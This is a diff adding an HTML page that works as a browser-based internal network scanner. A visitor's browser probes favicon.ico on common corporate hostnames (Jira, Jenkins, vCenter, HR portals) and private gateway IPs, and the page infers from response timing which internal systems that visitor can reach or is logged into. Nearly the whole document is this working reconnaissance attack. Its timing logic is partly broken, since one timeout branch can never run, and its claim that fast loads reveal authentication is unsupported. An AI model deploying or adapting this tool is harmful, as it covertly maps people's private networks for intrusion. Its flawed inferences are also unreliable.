@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Internal Network Favicon Scanner</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            padding: 30px;
+        }
+        h1 { color: #ff6b6b; margin-bottom: 5px; }
+        .subtitle { color: #666; margin-bottom: 20px; font-size: 0.85em; }
+        .explanation {
+            color: #888;
+            font-size: 0.82em;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            max-width: 700px;
+            border-left: 2px solid #333;
+            padding-left: 12px;
+        }
+        table {
+            border-collapse: collapse;
+            width: 100%;
+            max-width: 800px;
+            margin: 15px 0;
+        }
+        th {
+            text-align: left;
+            padding: 8px 12px;
+            border-bottom: 2px solid #333;
+            color: #888;
+            font-size: 0.85em;
+        }
+        td {
+            padding: 6px 12px;
+            border-bottom: 1px solid #1a1a1a;
+            font-size: 0.9em;
+        }
+        .status-alive { color: #0f0; font-weight: bold; }
+        .status-dead { color: #444; }
+        .status-pending { color: #666; }
+        .status-auth { color: #ff0; font-weight: bold; }
+        button {
+            background: #ff6b6b;
+            color: #000;
+            border: none;
+            padding: 10px 24px;
+            font-family: monospace;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 10px 5px 10px 0;
+        }
+        button:hover { background: #ff5252; }
+        #custom-target {
+            background: #111;
+            border: 1px solid #333;
+            color: #e0e0e0;
+            padding: 8px 12px;
+            font-family: monospace;
+            font-size: 14px;
+            width: 300px;
+            margin-right: 8px;
+        }
+        #log {
+            margin-top: 20px;
+            padding: 15px;
+            background: #111;
+            border: 1px solid #222;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 11px;
+            line-height: 1.5;
+        }
+        .log-found { color: #0f0; }
+        .log-miss { color: #666; }
+    </style>
+</head>
+<body>
+
+    <h1>🌐 Internal Network Favicon Scanner</h1>
+    <div class="subtitle">Enumerate internal hosts from an external website via favicon timing</div>
+
+    <div class="explanation">
+        <strong>How it works:</strong> The browser loads <code>&lt;link rel="icon"&gt;</code> pointing to 
+        internal hostnames. The request is <strong>credentialed</strong> (cookies, NTLM, Kerberos are sent 
+        automatically) and <strong>not subject to CORS preflight</strong>. By measuring response timing, 
+        we determine if each host exists on the user's network.<br><br>
+        <strong>What this reveals:</strong> Which internal systems the current user can reach, and 
+        potentially which ones they're authenticated to (based on response size/timing patterns).
+    </div>
+
+    <button onclick="startScan()">▶ Scan Common Internal Hosts</button>
+    <input type="text" id="custom-target" placeholder="custom-host.corp.local">
+    <button onclick="scanCustom()">Scan Custom</button>
+
+    <table>
+        <thead>
+            <tr>
+                <th>Host</th>
+                <th>Status</th>
+                <th>Response (ms)</th>
+                <th>Notes</th>
+            </tr>
+        </thead>
+        <tbody id="results"></tbody>
+    </table>
+
+    <div id="log"></div>
+
+    <script>
+        // ── Common internal hostnames to probe ─────────────────
+        // These are hostnames commonly found in corporate networks
+        const TARGETS = [
+            // Atlassian / Project Management
+            { host: "jira.internal", desc: "Jira (issue tracking)" },
+            { host: "confluence.internal", desc: "Confluence (wiki)" },
+            { host: "jira.corp.local", desc: "Jira (corp.local)" },
+
+            // CI/CD
+            { host: "jenkins.internal", desc: "Jenkins CI" },
+            { host: "gitlab.internal", desc: "GitLab" },
+            { host: "ci.internal", desc: "CI server" },
+
+            // Monitoring
+            { host: "grafana.internal", desc: "Grafana dashboards" },
+            { host: "kibana.internal", desc: "Kibana (ELK)" },
+            { host: "prometheus.internal", desc: "Prometheus" },
+
+            // Infrastructure
+            { host: "vcenter.internal", desc: "VMware vCenter" },
+            { host: "esxi.internal", desc: "ESXi host" },
+            { host: "proxmox.internal", desc: "Proxmox VE" },
+
+            // Business apps
+            { host: "erp.internal", desc: "ERP system" },
+            { host: "crm.internal", desc: "CRM system" },
+            { host: "hr.internal", desc: "HR portal" },
+            { host: "mail.internal", desc: "Mail server" },
+            { host: "intranet.internal", desc: "Intranet" },
+
+            // Kubernetes / Container
+            { host: "k8s.internal", desc: "Kubernetes dashboard" },
+            { host: "rancher.internal", desc: "Rancher" },
+            { host: "argocd.internal", desc: "Argo CD" },
+
+            // Common IP ranges (gateway, common services)
+            { host: "192.168.1.1", desc: "Default gateway" },
+            { host: "10.0.0.1", desc: "Internal gateway" },
+            { host: "172.16.0.1", desc: "Internal gateway (172)" },
+        ];
+
+        const resultsTable = document.getElementById('results');
+        const logEl = document.getElementById('log');
+
+        function addLog(msg, cls = '') {
+            const line = document.createElement('div');
+            line.className = cls;
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logEl.prepend(line);
+        }
+
+        function addResult(host, desc, status, time, notes) {
+            const row = document.createElement('tr');
+            const statusClass = status === 'ALIVE' ? 'status-alive'
+                : status === 'AUTH' ? 'status-auth'
+                : status === 'DOWN' ? 'status-dead'
+                : 'status-pending';
+
+            row.innerHTML = `
+                <td>${host}<br><small style="color:#555">${desc}</small></td>
+                <td class="${statusClass}">${status}</td>
+                <td>${time}</td>
+                <td style="color:#888;font-size:0.85em">${notes}</td>
+            `;
+            resultsTable.appendChild(row);
+        }
+
+        async function probeHost(target) {
+            return new Promise((resolve) => {
+                const { host, desc } = target;
+                const url = `https://${host}/favicon.ico`;
+                const start = performance.now();
+                let resolved = false;
+
+                const img = new Image();
+
+                const timeout = setTimeout(() => {
+                    if (!resolved) {
+                        resolved = true;
+                        const elapsed = performance.now() - start;
+
+                        // Timing analysis:
+                        // < 50ms: likely cached or local (host exists)
+                        // 50-500ms: host exists, responded with error or redirect
+                        // 500-2000ms: host might exist (slow response)
+                        // > 2000ms: DNS timeout (host doesn't exist)
+
+                        if (elapsed < 2000) {
+                            addResult(host, desc, 'TIMEOUT (possible)', `${elapsed.toFixed(0)}ms`, 'DNS resolution pending');
+                            addLog(`${host}: timeout at ${elapsed.toFixed(0)}ms - inconclusive`, 'log-miss');
+                        } else {
+                            addResult(host, desc, 'DOWN', `${elapsed.toFixed(0)}ms`, 'No response / DNS failure');
+                            addLog(`${host}: no response`, 'log-miss');
+                        }
+                        resolve({ host, alive: false, elapsed });
+                    }
+                }, 3000);
+
+                img.onload = () => {
+                    if (!resolved) {
+                        resolved = true;
+                        clearTimeout(timeout);
+                        const elapsed = performance.now() - start;
+                        addResult(host, desc, 'ALIVE', `${elapsed.toFixed(0)}ms`,
+                            elapsed < 50 ? '⚡ Very fast - likely authenticated (cached favicon)'
+                            : 'Favicon loaded successfully');
+                        addLog(`${host}: ALIVE (${elapsed.toFixed(0)}ms)`, 'log-found');
+                        resolve({ host, alive: true, elapsed });
+                    }
+                };
+
+                img.onerror = () => {
+                    if (!resolved) {
+                        resolved = true;
+                        clearTimeout(timeout);
+                        const elapsed = performance.now() - start;
+
+                        // Error with fast response = host exists but denied the request
+                        // This is STILL useful - we know the host is reachable
+                        if (elapsed < 1000) {
+                            addResult(host, desc, 'ALIVE', `${elapsed.toFixed(0)}ms`,
+                                'Host responded (denied/redirect) - confirms existence');
+                            addLog(`${host}: ALIVE (error response in ${elapsed.toFixed(0)}ms)`, 'log-found');
+                            resolve({ host, alive: true, elapsed });
+                        } else {
+                            addResult(host, desc, 'DOWN', `${elapsed.toFixed(0)}ms`, 'Connection failed');
+                            addLog(`${host}: down`, 'log-miss');
+                            resolve({ host, alive: false, elapsed });
+                        }
+                    }
+                };
+
+                img.src = url;
+            });
+        }
+
+        async function startScan() {
+            resultsTable.innerHTML = '';
+            addLog(`Starting scan of ${TARGETS.length} internal hosts...`);
+            addLog('Technique: favicon timing side-channel (no CORS, credentialed)');
+
+            for (const target of TARGETS) {
+                await probeHost(target);
+                // Stagger requests to avoid overwhelming
+                await new Promise(r => setTimeout(r, 100));
+            }
+
+            const aliveCount = document.querySelectorAll('.status-alive').length;
+            addLog(`Scan complete: ${aliveCount}/${TARGETS.length} hosts alive`, aliveCount > 0 ? 'log-found' : 'log-miss');
+        }
+
+        function scanCustom() {
+            const input = document.getElementById('custom-target');
+            const host = input.value.trim();
+            if (!host) return;
+
+            addLog(`Probing custom target: ${host}`);
+            probeHost({ host, desc: 'Custom target' });
+            input.value = '';
+        }
+    </script>
+
+</body>
+</html>
